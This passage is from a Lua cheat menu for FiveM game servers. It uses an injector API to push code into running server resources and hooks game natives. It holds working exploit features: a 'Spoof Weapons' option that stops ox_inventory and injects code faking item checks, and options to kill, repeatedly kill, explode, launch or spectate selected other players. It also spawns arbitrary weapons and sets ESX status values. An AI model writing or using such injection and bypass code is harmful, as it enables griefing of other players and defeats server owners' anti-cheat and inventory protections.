                                    _G.AntiStunThread = true

                                    CreateThread(function()
                                        while _G.AntiStunEnabled do
                                            local ped = PlayerPedId()

                                            SetPedCanRagdoll(ped, false)
                                            SetPedCanBeKnockedOffVehicle(ped, 1)
                                            SetPedConfigFlag(ped, 32, false)
                                            SetPedConfigFlag(ped, 118, false)
                                            SetPedConfigFlag(ped, 166, false)
                                            SetPedConfigFlag(ped, 292, false)

                                            Wait(500)
                                        end

                                        local ped = PlayerPedId()
                                        SetPedCanRagdoll(ped, true)
                                        SetPedCanBeKnockedOffVehicle(ped, 0)
                                        SetPedConfigFlag(ped, 32, true)
                                        SetPedConfigFlag(ped, 118, true)
                                        SetPedConfigFlag(ped, 166, true)
                                        SetPedConfigFlag(ped, 292, true)

                                        _G.AntiStunThread = nil
                                    end)
                                end
                                sendNotification("Anti-Stun", "Enabled", "success", 2000)
                            end
                        else
                            if canInjectResource() then
                                local code = [[_G.AntiStunEnabled = false]]
                                MachoInjectResource2(3, "any", code)
                            else
                                _G.AntiStunEnabled = false
                            end
                            sendNotification("Anti-Stun", "Disabled", "info", 2000)
                        end
                    end
                },
                {
                    label = "Fast Run",
                    type = "checkbox",
                    checked = false,
                    onConfirm = function(checked)
                        if checked then
                            if canInjectResource() then
                                local code = [[
                                    _G.FastRunEnabled = true

                                    CreateThread(function()
                                        while _G.FastRunEnabled do
                                            local ped = PlayerPedId()
                                            if ped and DoesEntityExist(ped) and not IsPedInAnyVehicle(ped, false) then
                                                SetRunSprintMultiplierForPlayer(PlayerId(), 1.45)
                                            end
                                            Wait(500)
                                        end
                                    end)
                                ]]
                                MachoInjectResource2(3, "any", code)
                                sendNotification("Fast Run", "Enabled", "success", 2000)
                            else
                                _G.FastRunEnabled = true

                                CreateThread(function()
                                    while _G.FastRunEnabled do
                                        local ped = PlayerPedId()
                                        if ped and DoesEntityExist(ped) and not IsPedInAnyVehicle(ped, false) then
                                            SetRunSprintMultiplierForPlayer(PlayerId(), 1.45)
                                        end
                                        Wait(500)
                                    end
                                end)
                                sendNotification("Fast Run", "Enabled", "success", 2000)
                            end
                        else
                            if canInjectResource() then
                                local code = [[
                                    _G.FastRunEnabled = false
                                    CreateThread(function()
                                        SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                                    end)
                                ]]
                                MachoInjectResource2(3, "any", code)
                            else
                                _G.FastRunEnabled = false
                                CreateThread(function()
                                    SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                                end)
                            end
                            sendNotification("Fast Run", "Disabled", "info", 2000)
                        end
                    end
                },
                {
                    label = "Full Food (ESX)",
                    type = "button",
                    onConfirm = function()
                        if canInjectResource() then
                            local code = [[
                                function SetFullHunger()
                                    CreateThread(function()
                                        TriggerEvent('esx_status:set', 'hunger', 1000000)
                                    end)
                                end
                                SetFullHunger()
                            ]]
                            MachoInjectResourceRaw("any", code)
                        else
                        TriggerEvent('esx_status:set', 'hunger', 1000000)
                        end
                        sendNotification("Full Food (ESX)", "Hunger set to maximum", "success", 3000)
                    end
                },
                {
                    label = "Full Thirst (ESX)",
                    type = "button",
                    onConfirm = function()
                        if canInjectResource() then
                            local code = [[
                                function SetFullThirst()
                                    CreateThread(function()
                                        TriggerEvent('esx_status:set', 'thirst', 1000000)
                                    end)
                                end
                                SetFullThirst()
                            ]]
                            MachoInjectResourceRaw("any", code)
                        else
                        TriggerEvent('esx_status:set', 'thirst', 1000000)
                        end
                        sendNotification("Full Thirst (ESX)", "Thirst set to maximum", "success", 3000)
                    end
                },

                {
                    label = "Remove Stress (ESX)",
                    type = "button",
                    onConfirm = function()
                        if canInjectResource() then
                            local code = [[
                                function RemoveStress()
                                    CreateThread(function()
                                        TriggerEvent('esx_status:set', 'stress', 0)
                                    end)
                                end
                                RemoveStress()
                            ]]
                            MachoInjectResourceRaw("any", code)
                        else
                        TriggerEvent('esx_status:set', 'stress', 0)
                        end
                        sendNotification("Remove Stress (ESX)", "Stress removed", "success", 3000)
                    end
                },                                                
            }
        },        
        {
            name = 'Bypasses',
            submenu = {
                {
                    label = 'Coming Soon',
                    type = 'button',
                    onConfirm = function()
                    print("Coming Soon")
                    sendNotification("Coming Soon", "Coming Soon", "info", 2000)
                    end
                }            
            }
        },
        {
            name = 'Wardrobe',
            submenu = {
                {
                    label = 'Random Outfit',
                    type = 'button',
                    onConfirm = function()
                        sendNotification("Wardrobe", "Randomizng...", "info", 2000)

                        local playerPed = PlayerPedId()
                        local myCoords = GetEntityCoords(playerPed)
                        local nearbyOutfits = {}


                        for _, playerId in ipairs(GetActivePlayers()) do
                            local targetPed = GetPlayerPed(playerId)
                            if targetPed ~= playerPed and DoesEntityExist(targetPed) then
                                local distance = #(GetEntityCoords(targetPed) - myCoords)
                                if distance < 100.0 then
                                    local outfit = {
                                        components = {},
                                        props = {}
                                    }


                                    for i = 0, 11 do
                                        outfit.components[i] = {
                                            drawable = GetPedDrawableVariation(targetPed, i),
                                            texture = GetPedTextureVariation(targetPed, i)
                                        }
                                    end


                                    for i = 0, 7 do
                                        local propIndex = GetPedPropIndex(targetPed, i)
                                        if propIndex ~= -1 then
                                            outfit.props[i] = {
                                                drawable = propIndex,
                                                texture = GetPedPropTextureIndex(targetPed, i),
                                                enabled = true
                                            }
                                        else
                                            outfit.props[i] = {
                                                drawable = -1,
                                                texture = 0,
                                                enabled = false
                                            }
                                        end
                                    end

                                    table.insert(nearbyOutfits, outfit)
                                end
                            end
                        end

                        if #nearbyOutfits == 0 then
                            sendNotification("Wardrobe", "No nearby players found, using random...", "info", 2000)


                            local function GetRandomComponent(componentId)
                                local numDrawables = GetNumberOfPedDrawableVariations(playerPed, componentId)
                                if numDrawables > 0 then
                                    local drawable = math.random(0, numDrawables - 1)
                                    local numTextures = GetNumberOfPedTextureVariations(playerPed, componentId, drawable)
                                    local texture = numTextures > 0 and math.random(0, numTextures - 1) or 0
                                    return {drawable = drawable, texture = texture}
                                end
                                return {drawable = 0, texture = 0}
                            end


                            for i = 0, 11 do
                                local data = GetRandomComponent(i)
                                SetPedComponentVariation(playerPed, i, data.drawable, data.texture, 0)
                            end


                            for i = 0, 7 do
                                if math.random() > 0.7 then
                                    local numProps = GetNumberOfPedPropDrawableVariations(playerPed, i)
                                    if numProps > 0 then
                                        local drawable = math.random(0, numProps - 1)
                                        local numTextures = GetNumberOfPedPropTextureVariations(playerPed, i, drawable)
                                        local texture = numTextures > 0 and math.random(0, numTextures - 1) or 0
                                        SetPedPropIndex(playerPed, i, drawable, texture, true)
                                    end
                                else
                                    ClearPedProp(playerPed, i)
                                end
                            end

                            sendNotification("Wardrobe", "Random outfit applied", "success", 3000)
                        else

                            

                            local selectedOutfit = nearbyOutfits[math.random(1, #nearbyOutfits)]

                            
                            local mixedOutfit = {
                                components = {},
                                props = {}
                            }

                            for i = 0, 11 do
                                local sourceOutfit = nearbyOutfits[math.random(1, #nearbyOutfits)]
                                mixedOutfit.components[i] = sourceOutfit.components[i]
                            end

                            for i = 0, 7 do
                                local sourceOutfit = nearbyOutfits[math.random(1, #nearbyOutfits)]
                                mixedOutfit.props[i] = sourceOutfit.props[i]
                            end

                            
                            for componentId, data in pairs(mixedOutfit.components) do
                                SetPedComponentVariation(playerPed, componentId, data.drawable, data.texture, 0)
                            end

                            for propId, data in pairs(mixedOutfit.props) do
                                if data.enabled then
                                    SetPedPropIndex(playerPed, propId, data.drawable, data.texture, true)
                                else
                                    ClearPedProp(playerPed, propId)
                                end
                            end

                            sendNotification("Wardrobe", "Realistic outfit applied", "success", 3000)
                        end
                    end
                },
                {
                    label = 'Save Outfit',
                    type = 'button',
                    onConfirm = function()
                        local ped = PlayerPedId()
                        savedOutfit = {}
                        for i = 0, 11 do
                            savedOutfit[i] = {
                                drawable = GetPedDrawableVariation(ped, i),
                                texture = GetPedTextureVariation(ped, i)
                            }
                        end
                        for i = 0, 7 do
                            if GetPedPropIndex(ped, i) ~= -1 then
                                savedOutfit["prop_"..i] = {
                                    drawable = GetPedPropIndex(ped, i),
                                    texture = GetPedPropTextureIndex(ped, i)
                                }
                            end
                        end
                        sendNotification("Wardrobe", "Outfit saved!", "success", 3000)
                    end
                },
                {
                    label = 'Load Outfit',
                    type = 'button',
                    onConfirm = function()
                        if not savedOutfit then
                            sendNotification("Wardrobe", "No outfit saved!", "error", 3000)
                            return
                        end
                        local ped = PlayerPedId()
                        for i = 0, 11 do
                            if savedOutfit[i] then
                                SetPedComponentVariation(ped, i, savedOutfit[i].drawable, savedOutfit[i].texture, 0)
                            end
                        end
                        for i = 0, 7 do
                            local key = "prop_"..i
                            if savedOutfit[key] then
                                SetPedPropIndex(ped, i, savedOutfit[key].drawable, savedOutfit[key].texture, true)
                            else
                                ClearPedProp(ped, i)
                            end
                        end
                        sendNotification("Wardrobe", "Outfit loaded!", "success", 3000)
                    end
                },
                {
                    label = 'Clear Props',
                    type = 'button',
                    onConfirm = function()
                        local ped = PlayerPedId()
                        for i = 0, 7 do
                            ClearPedProp(ped, i)
                        end
                        sendNotification("Wardrobe", "All props removed!", "success", 3000)
                    end
                }
            }
        }
    }
})

local selectedPlayers = {}

local function sendMenu()
    if dui then
        MachoSendDuiMessage(dui, json.encode({ action = 'setCurrent', current = activeIndex, menu = activeMenu }))
    end
end

 local playerItems = {}
  local lastPlayerCount = 0

  local function refreshPlayerItems()
      for k in pairs(playerItems) do playerItems[k] = nil end

      table.insert(playerItems, {
          label = "Select All",
          type = "button",
          onConfirm = function()
              for _, item in ipairs(playerItems) do
                  if item.serverId then
                      item.checked = true
                      selectedPlayers[item.serverId] = true
                  end
              end
              sendMenu()
          end
      })

      table.insert(playerItems, {
          label = "Unselect All",
          type = "button",
          onConfirm = function()
              for _, item in ipairs(playerItems) do
                  if item.serverId then
                      item.checked = false
                  end
              end
              selectedPlayers = {}
              sendMenu()
          end
      })

      local myPed = PlayerPedId()
      local myCoords = GetEntityCoords(myPed)
      local playersWithDistance = {}

      for _, i in ipairs(GetActivePlayers()) do
          local serverId = GetPlayerServerId(i)
          local playerName = GetPlayerName(i)
          local playerPed = GetPlayerPed(i)
          local playerCoords = GetEntityCoords(playerPed)
          local distance = #(myCoords - playerCoords)

          table.insert(playersWithDistance, {
              serverId = serverId,
              playerName = playerName,
              distance = distance
          })
      end

      table.sort(playersWithDistance, function(a, b)
          return a.distance < b.distance
      end)

      for _, playerData in ipairs(playersWithDistance) do
          local item = {
              label = playerData.playerName .. " [" .. playerData.serverId .. "]",
              type = "checkbox",
              checked = selectedPlayers[playerData.serverId] == true,
              serverId = playerData.serverId,
              onConfirm = function(checked)
                  if checked then
                      selectedPlayers[playerData.serverId] = true
                  else
                      selectedPlayers[playerData.serverId] = nil
                  end
              end
          }

          table.insert(playerItems, item)
      end
  end

  CreateThread(function()
      while not Unloaded do
          Wait(1000)

          local currentPlayerCount = #GetActivePlayers()

          if currentPlayerCount ~= lastPlayerCount then
              lastPlayerCount = currentPlayerCount
              refreshPlayerItems()

              if activeMenu == playerItems and showing then
                  setCurrent()
              end
          end
      end
  end)

  refreshPlayerItems()
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end





local function IopcLSiadm(targetPed)
    local shooter = PlayerPedId()
    local weapon = GetHashKey("WEAPON_PRECISIONRIFLE")

    GiveWeaponToPed(shooter, weapon, 250, false, false)
    SetCurrentPedWeapon(shooter, weapon, true)

    local bone = 12844
    local coords = GetPedBoneCoords(targetPed, bone, 0.0, 0.0, 0.0)
    local origin = vector3(coords.x, coords.y, coords.z + 10.0)

    ShootSingleBulletBetweenCoords(
        origin.x, origin.y, origin.z,
        coords.x, coords.y, coords.z,
        100.0, true, weapon, shooter, true, false, -1.0
    )
end

local function killSelectedPlayers()
    for playerId, _ in pairs(selectedPlayers or {}) do
        local player = GetPlayerFromServerId(tonumber(playerId))
        if not player or player == -1 then goto continue end

        local ped = GetPlayerPed(player)
        if not ped or ped == 0 then goto continue end

        IopcLSiadm(ped)

        sendNotification("Kill Player", "Player(s) Killed", "success", 3000)
        ::continue::
    end
end



local function permKillSelectedPlayers()
    if _G.permKillEnabled then return end
    _G.permKillEnabled = true

    CreateThread(function()
        while _G.permKillEnabled do
            for playerId, _ in pairs(selectedPlayers or {}) do
                local serverPlayerId = tonumber(playerId)
                if serverPlayerId then
                    for i = 0, 255 do
                        if NetworkIsPlayerActive(i) and GetPlayerServerId(i) == serverPlayerId then
                            local targetPed = GetPlayerPed(i)
                            if targetPed and DoesEntityExist(targetPed) and targetPed ~= 0 then
                                local shooter = PlayerPedId()
                                local weapon = GetHashKey("WEAPON_TECPISTOL")

                                GiveWeaponToPed(shooter, weapon, 255, false, false)
                                SetCurrentPedWeapon(shooter, weapon, true)

                                local coords = GetPedBoneCoords(targetPed, 12844, 0.0, 0.0, 0.0)
                                local from = vector3(coords.x, coords.y, coords.z + 10.0)

                                ShootSingleBulletBetweenCoords(
                                    from.x, from.y, from.z,
                                    coords.x, coords.y, coords.z,
                                    500.0, true, weapon, shooter, true, false, -1.0
                                )
                            end
                            break
                        end
                    end
                end
            end

            Wait(1000)
        end
    end)

    sendNotification("Perm Kill", "Enabled", "success", 3000)
end

local function stopPermKill()
    _G.permKillEnabled = false
    sendNotification("Perm Kill", "Disabled", "info", 3000)
end




hNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)

          MachoHookNative(0x3C9BCEC1DCF3C7E7, function(toggle, targetPed)
              return true, toggle, targetPed
          end)

  local spectatingTarget = nil

  local function spectateSelectedPlayer()
      for playerId, _ in pairs(selectedPlayers or {}) do
          local targetPlayer = nil
          for i = 0, 255 do
              if NetworkIsPlayerActive(i) then
                  if GetPlayerServerId(i) == tonumber(playerId) then
                      targetPlayer = i
                      break
                  end
              end
          end

          if not targetPlayer then goto continue end

          local targetPed = GetPlayerPed(targetPlayer)
          if not (targetPed and targetPed ~= 0) then goto continue end

          spectatingTarget = targetPed

          if canInjectResource() then
              local spectateCode = string.format([[
                  NetworkSetInSpectatorMode(true, %d)
              ]], targetPed)
              MachoInjectResource2(3, "any", spectateCode)
          else
              NetworkSetInSpectatorMode(true, targetPed)
          end

          sendNotification("Spectate Player", "Now spectating player", "success", 3000)
          break

          ::continue::
      end
  end

  local function stopSpectating()
      local ped = PlayerPedId()

      if canInjectResource() then
          local stopCode = [[
              NetworkSetInSpectatorMode(false, PlayerPedId())
          ]]
          MachoInjectResource2(3, "any", stopCode)
      else
          NetworkSetInSpectatorMode(false, ped)
      end

      spectatingTarget = nil
      sendNotification("Spectate Player", "Stopped spectating", "info", 3000)
  end

hNative("AddOwnedExplosion", function(originalFn, ...) return originalFn(...) end)

  local function explodeSelectedPlayers()
      for playerId, _ in pairs(selectedPlayers or {}) do
          local player = GetPlayerFromServerId(tonumber(playerId))
          if not (player and player ~= -1) then goto continue end

          local targetPed = GetPlayerPed(player)
          if not (targetPed and targetPed ~= 0) then goto continue end

          local ped = PlayerPedId()
          local targetCoords = GetEntityCoords(targetPed)

          AddOwnedExplosion(ped, targetCoords.x, targetCoords.y, targetCoords.z, 2, 1.0, true, false, 1.0)

          sendNotification("Explode Player", "Player(s) Exploded", "success", 3000)

          ::continue::
      end
  end


  Hn("NetworkIsPlayerActive", function(originalFn, ...) return safeCall(originalFn, ...) end)
  Hn("GetPlayerServerId", function(originalFn, ...) return safeCall(originalFn, ...) end)
  Hn("GetPlayerPed", function(originalFn, ...) return safeCall(originalFn, ...) end)
  Hn("DoesEntityExist", function(originalFn, ...) return safeCall(originalFn, ...) end)
  Hn("PlayerPedId", function(originalFn, ...) return safeCall(originalFn, ...) end)
  Hn("GetEntityCoords", function(originalFn, ...) return safeCall(originalFn, ...) end)
  Hn("SetEntityCoordsNoOffset", function(originalFn, ...) return safeCall(originalFn, ...) end)
  Hn("SetEntityVisible", function(originalFn, ...) return safeCall(originalFn, ...) end)
  Hn("ClearPedTasksImmediately", function(originalFn, ...) return safeCall(originalFn, ...) end)
  Hn("SetEntityCoords", function(originalFn, ...) return safeCall(originalFn, ...) end)
  Hn("AttachEntityToEntityPhysically", function(originalFn, ...) return safeCall(originalFn, ...) end)
  Hn("DetachEntity", function(originalFn, ...) return safeCall(originalFn, ...) end)

function LaunchPlayer(playerIds, radius)
    if not playerIds or #playerIds == 0 then
        return
    end

    local targetServerId = tonumber(playerIds[1])
    if not targetServerId then
        return
    end

    radius = radius or 3000.0

    CreateThread(function()
        local targetPlayer = nil
        for i = 0, 255 do
            if NetworkIsPlayerActive(i) and GetPlayerServerId(i) == targetServerId then
                targetPlayer = i
                break
            end
        end

        if not targetPlayer then return end

        local targetPed = GetPlayerPed(targetPlayer)
        if not targetPed or not DoesEntityExist(targetPed) then return end

        local myPed = PlayerPedId()
        if not myPed then return end

        local myCoords = GetEntityCoords(myPed)
        local targetCoords = GetEntityCoords(targetPed)
        if not myCoords or not targetCoords then return end

        local distance = #(myCoords - targetCoords)
        local teleported = false
        local originalCoords = myCoords

        if distance > 10.0 then
            local angle = math.random() * 2 * math.pi
            local offset = math.random(5, 9)

            local newCoords = vector3(
                targetCoords.x + math.cos(angle) * offset,
                targetCoords.y + math.sin(angle) * offset,
                targetCoords.z
            )

            SetEntityCoordsNoOffset(myPed, newCoords.x, newCoords.y, newCoords.z, false, false, false)
            SetEntityVisible(myPed, false, false)
            teleported = true
            Wait(100)
        end

        ClearPedTasksImmediately(myPed)
        for i = 1, 15 do
            if not DoesEntityExist(targetPed) then break end

            local curTargetCoords = GetEntityCoords(targetPed)
            if not curTargetCoords then break end

            SetEntityCoords(myPed, curTargetCoords.x, curTargetCoords.y, curTargetCoords.z + 0.5, false, false, false, false)
            Wait(50)

            AttachEntityToEntityPhysically(
                myPed, targetPed, 0,
                0.0, 0.0, 0.0,
                150.0, 0.0, 0.0,
                0.0, 0.0, 0.0,
                1, false, false, 1, 2
            )

            Wait(50)
            DetachEntity(myPed, true, true)
            Wait(100)
        end

        ClearPedTasksImmediately(myPed)
        SetEntityVelocity(myPed, 0.0, 0.0, 0.0)

        FreezeEntityPosition(myPed, true)
        RequestCollisionAtCoord(originalCoords.x, originalCoords.y, originalCoords.z)

        SetEntityCoordsNoOffset(
            myPed,
            originalCoords.x,
            originalCoords.y,
            originalCoords.z + 1.0,
            false, false, false
        )

        Wait(150)

        SetEntityCoordsNoOffset(
            myPed,
            originalCoords.x,
            originalCoords.y,
            originalCoords.z,
            false, false, false
        )

        FreezeEntityPosition(myPed, false)

        if teleported then
            Wait(50)
            SetEntityVisible(myPed, true, false)
        end
    end)
end



local function teleportToPlayer()
    for playerId,_ in pairs(selectedPlayers) do
        local player = GetPlayerFromServerId(playerId)
        if player and player ~= -1 then
            local ped = GetPlayerPed(player)
            if ped and ped ~= 0 then
                local coords = GetEntityCoords(ped)
                local groundZPtr = Citizen.PointerValueFloat()
                local myPed = PlayerPedId()
                SetEntityCoords(myPed, coords.x, coords.y, coords.z, false, false, false, false)
                sendNotification("Teleport", "Teleported to player!", "success", 3000)
                return
            end
        end
    end
end

function CopyPlayerOutfit()
    for playerId, _ in pairs(selectedPlayers or {}) do
        local player = GetPlayerFromServerId(tonumber(playerId))
        if not (player and player ~= -1) then goto continue end

        local targetPed = GetPlayerPed(player)
        if not (targetPed and targetPed ~= 0) then goto continue end

        local myPed = PlayerPedId()

        for i = 0, 11 do
            SetPedComponentVariation(myPed,
                i,
                GetPedDrawableVariation(targetPed, i),
                GetPedTextureVariation(targetPed, i),
                GetPedPaletteVariation(targetPed, i)
            )
        end

        for i = 0, 2 do
            local propId = GetPedPropIndex(targetPed, i)
            if propId ~= -1 then
                SetPedPropIndex(myPed, i, propId, GetPedPropTextureIndex(targetPed, i), true)
            else
                ClearPedProp(myPed, i)
            end
        end

        SetPedHairColor(myPed, GetPedHairColor(targetPed), GetPedHairHighlightColor(targetPed))
        sendNotification("Copy Outfit", "Outfit Copied!", "success", 3000)
        break

        ::continue::
    end
end

local teleportVehiclesToggle = false
local makePedsHostileToggle = false
local trapPlayersToggle = false

table.insert(activeMenu, {
    label = 'Online',
    type = 'submenu',
    tabs = {
        {
            name = 'List',
            submenu = playerItems
        },
        {
            name = 'Safe',
            submenu = {
                {
                    type = 'checkbox',
                    label = 'Spectate Player',
                    value = spectateEnabled or false,
                    onConfirm = function(setToggle)
                        spectateEnabled = setToggle

                        if setToggle then
                            spectateSelectedPlayer()
                        else
                            stopSpectating()
                        end
                    end
                },
                {
                    type = 'checkbox',
                    label = 'Perm Kill',
                    value = permKillEnabled or false,
                    onConfirm = function(setToggle)
                        permKillEnabled = setToggle

                        if setToggle then
                            permKillSelectedPlayers()
                        else
                            stopPermKill()
                        end
                    end
                },
                {
                    label = "Launch Player",
                    type = "button",
                    onConfirm = function()
                        if not selectedPlayers or not next(selectedPlayers) then
                            sendNotification("Launch Player", "No players selected", "error", 2000)
                            return
                        end

                        local playerIds = {}
                        for playerId, _ in pairs(selectedPlayers) do
                            table.insert(playerIds, playerId)
                        end

                        LaunchPlayer(playerIds, 3000.0)
                        sendNotification("Launch Player", "Launching player", "success", 3000)
                    end
                },                                                    
                {
                    type = 'button',
                    label = 'Teleport',
                    onConfirm = teleportToPlayer
                },
                {
                    type = 'button',
                    label = 'Copy Outfit',
                    onConfirm = CopyPlayerOutfit
                },
                {
                    type = 'button',
                    label = 'Kill Player',
                    onConfirm = killSelectedPlayers
                },
                {
                    type = 'button',
                    label = 'Explode Player',
                    onConfirm = explodeSelectedPlayers
                }                                
            }
        }
    }
})

function SpawnWeapon(weapon)
    local ped = PlayerPedId()
    local hash = GetHashKey(weapon)
    GiveWeaponToPed(ped, hash, 999, false, true)
    sendNotification("Weapon", weapon .. " spawned!", "success", 3000)
end



  local function safeCall(fn, ...) if fn then return fn(...) end end
  local function Hn(nativeName, newFunction)
      local originalNative = _G[nativeName]
      local safeOriginal = originalNative and type(originalNative) == "function" and originalNative or function()
  end
      _G[nativeName] = function(...) return newFunction(safeOriginal, ...) end
  end


table.insert(activeMenu, {
    label = 'Weapon',
    type = 'submenu',
    tabs = {
        {
            name = 'Spawner',
            submenu = {
                {
                    label = "Spoof Weapons",
                    type = "checkbox",
                    checked = false,
                    onConfirm = function(checked)
                        if checked then
                            local code = [[
                                _G.originalTriggerServerEvent = _G.TriggerServerEvent
                                _G.originalGetConvarInt = _G.GetConvarInt
                                _G.originalAwait = lib and lib.callback and lib.callback.await

                                _G.TriggerServerEvent = function(eventName, ...)
                                    if eventName == "ox_inventory:usedItemInternal" then
                                        return originalTriggerServerEvent(eventName, ...)
                                    end
                                    return originalTriggerServerEvent(eventName, ...)
                                end

                                _G.GetConvarInt = function(convar, default)
                                    if convar == "inventory:weaponmismatch" then
                                        return 0
                                    end
                                    return originalGetConvarInt(convar, default)
                                end

                                if lib and lib.callback then
                                    lib.callback.await = function(eventName, timeout, ...)
                                        if eventName == "ox_inventory:useItem" then
                                            local args = {...}
                                            local itemName = args[1]
                                            local slot = args[2]
                                            if slot and PlayerData and PlayerData.inventory and PlayerData.inventory[slot] and PlayerData.inventory[slot].name == itemName then
                                                return originalAwait(eventName, timeout, ...)
                                            end
                                            return true
                                        end
                                        return originalAwait(eventName, timeout, ...)
                                    end
                                end
                            ]]

                            if canInjectResource() then
                                MachoResourceStop("ox_inventory")
                                MachoInjectResource2(3, "ox_inventory", code)
                            end

                            sendNotification("Spoof Weapons", "Enabled", "success", 2000)
                        else
                            local code = [[
                                if _G.originalTriggerServerEvent then
                                    _G.TriggerServerEvent = _G.originalTriggerServerEvent
                                end
                                if _G.originalGetConvarInt then
                                    _G.GetConvarInt = _G.originalGetConvarInt
                                end
                                if lib and lib.callback and _G.originalAwait then
                                    lib.callback.await = _G.originalAwait
                                end
                            ]]

                            if canInjectResource() then
                                MachoResourceStart("ox_inventory")
                                MachoInjectResource2(3, "ox_inventory", code)
                            end

                            sendNotification("Spoof Weapons", "Disabled", "info", 2000)
                        end
                    end
                },              
                {
                    label = "Spawn Custom Weapon",
                    type = "button",
                    onConfirm = function()
                        openInputDialog("Enter weapon name:", 50, function(input)
                            if not input or input == "" then
                                sendNotification("Spawn Weapon", "Invalid weapon name", "error", 2000)
                                return
                            end

                            local weapon = input
                            if not string.find(weapon:lower(), "^weapon_") then
                                weapon = "WEAPON_" .. weapon:upper()
                            end

                            if canInjectResource() then
                                local code = string.format([[
                                    CreateThread(function()
                                        local hash = GetHashKey("%s")
                                        local ped = PlayerPedId()
                                        for i = 1, 5 do
                                            GiveWeaponToPed(ped, hash, 999, false, true)
                                            SetCurrentPedWeapon(ped, hash, true)
                                            Wait(10)
                                        end
                                    end)
                                ]], weapon)
                                MachoInjectResource2(3, "any", code)
                                sendNotification("Spawn Weapon", "Spawned: " .. weapon .. "", "success", 2000)
                            else
                                CreateThread(function()
                                    local hash = GetHashKey(weapon)
                                    local ped = PlayerPedId()
                                    for i = 1, 5 do
                                        GiveWeaponToPed(ped, hash, 999, false, true)
                                        Wait(10)
                                    end
                                end)
                                sendNotification("Spawn Weapon", "Spawned: " .. weapon .. "", "success", 2000)
                            end
                        end)
                    end
                },  
                {
                    type = 'button',
                    label = 'Remove Current Weapon',
                    onConfirm = function()
                        local remove_weapon_code = [[
                            local playerPed = PlayerPedId()
                            local currentWeapon = GetSelectedPedWeapon(playerPed)

                            if currentWeapon ~= GetHashKey("WEAPON_UNARMED") then
                                RemoveWeaponFromPed(playerPed, currentWeapon)
                                SetCurrentPedWeapon(playerPed, GetHashKey("WEAPON_UNARMED"), true)

                            end
                        ]]

                        MachoInjectResource2(1, "any", remove_weapon_code)
                    end
                },                              
                {
                    label = 'Pistols',
                    type = 'scroll',
                    selected = 1,
                    options = {
                        { label = 'Pistol',                 value = 'weapon_pistol' },
                        { label = 'Combat Pistol',          value = 'weapon_combatpistol' },
                        { label = 'AP Pistol',              value = 'weapon_appistol' },
                        { label = 'Pistol .50',             value = 'weapon_pistol50' },
                        { label = 'Heavy Pistol',           value = 'weapon_heavypistol' },
                        { label = 'SNS Pistol',             value = 'weapon_snspistol' },
                        { label = 'Vintage Pistol',         value = 'weapon_vintagepistol' },
                        { label = 'Marksman Pistol',        value = 'weapon_marksmanpistol' }
                    },
                    onConfirm = function(selected)
                        SpawnWeapon(selected.value)
                    end
                },
                {
                    label = 'SMGs',
                    type = 'scroll',
                    selected = 1,
                    options = {
                        { label = 'Micro SMG',              value = 'weapon_microsmg' },
                        { label = 'SMG',                    value = 'weapon_smg' },
                        { label = 'SMG Mk II',              value = 'weapon_smg_mk2' },
                        { label = 'Assault SMG',            value = 'weapon_assaultsmg' },
                        { label = 'Combat PDW',             value = 'weapon_combatpdw' },
                        { label = 'Machine Pistol',         value = 'weapon_machinepistol' },
                        { label = 'Mini SMG',               value = 'weapon_minismg' }
                    },
                    onConfirm = function(selected)
                        SpawnWeapon(selected.value)
                    end
                },
                {
                    label = 'Assault Rifles',
                    type = 'scroll',
                    selected = 1,
                    options = {
                        { label = 'Assault Rifle',          value = 'weapon_assaultrifle' },
                        { label = 'Assault Rifle Mk II',    value = 'weapon_assaultrifle_mk2' },
                        { label = 'Carbine Rifle',          value = 'weapon_carbinerifle' },
                        { label = 'Carbine Rifle Mk II',    value = 'weapon_carbinerifle_mk2' },
                        { label = 'Advanced Rifle',         value = 'weapon_advancedrifle' },
                        { label = 'Special Carbine',        value = 'weapon_specialcarbine' }
                    },
                    onConfirm = function(selected)
                        SpawnWeapon(selected.value)
                    end
                },
                {
                    label = 'LMGs',
                    type = 'scroll',
                    selected = 1,
                    options = {
                        { label = 'MG',                     value = 'weapon_mg' },
                        { label = 'Combat MG',              value = 'weapon_combatmg' },
                        { label = 'Combat MG Mk II',        value = 'weapon_combatmg_mk2' },
                        { label = 'Gusenberg Sweeper',      value = 'weapon_gusenberg' }
                    },
                    onConfirm = function(selected)
                        SpawnWeapon(selected.value)
                    end
                },
                {
                    label = 'Shotguns',
                    type = 'scroll',
                    selected = 1,
                    options = {
                        { label = 'Pump Shotgun',           value = 'weapon_pumpshotgun' },
                        { label = 'Pump Shotgun Mk II',     value = 'weapon_pumpshotgun_mk2' },
                        { label = 'Sawed-off Shotgun',      value = 'weapon_sawnoffshotgun' },
                        { label = 'Assault Shotgun',        value = 'weapon_assaultshotgun' },
                        { label = 'Bullpup Shotgun',        value = 'weapon_bullpupshotgun' },
                        { label = 'Heavy Shotgun',          value = 'weapon_heavyshotgun' }
                    },
                    onConfirm = function(selected)
                        SpawnWeapon(selected.value)
                    end
                },
                {
                    label = 'rpgs',
                    type = 'scroll',
                    selected = 1,
                    options = {
                        { label = 'P rocket',           value = 'weapon_passenger_rocket' },
                        { label = 'Rpg',     value = 'weapon_rpg_2' },
                        { label = 'aRocket',      value = 'WEAPON_AIRSTRIKE_ROCKET' }
                    },
                    onConfirm = function(selected)
                        SpawnWeapon(selected.value)
                    end
                },                
                {
                    label = 'Sniper Rifles',
                    type = 'scroll',
                    selected = 1,
                    options = {
                        { label = 'Sniper Rifle',           value = 'weapon_sniperrifle' },
                        { label = 'Heavy Sniper',           value = 'weapon_heavysniper' },
                        { label = 'Heavy Sniper Mk II',     value = 'weapon_heavysniper_mk2' },
                        { label = 'Marksman Rifle',         value = 'weapon_marksmanrifle' },
                        { label = 'Marksman Rifle Mk II',   value = 'weapon_marksmanrifle_mk2' },
                        { label = 'Precision Rifle',        value = 'weapon_precisionrifle' }
                    },
                    onConfirm = function(selected)
                        SpawnWeapon(selected.value)
                    end
                }
            }
        },
        {
            name = 'Customization',
            submenu = {
                {
                    label = 'Rapid Fire',
                    type  = 'checkbox',
                    onConfirm = function()
                        
                    end
                },
            }
        }
    }
})

table.insert(activeMenu, {
    label = 'Vehicle',
    type = 'submenu',
    tabs = {
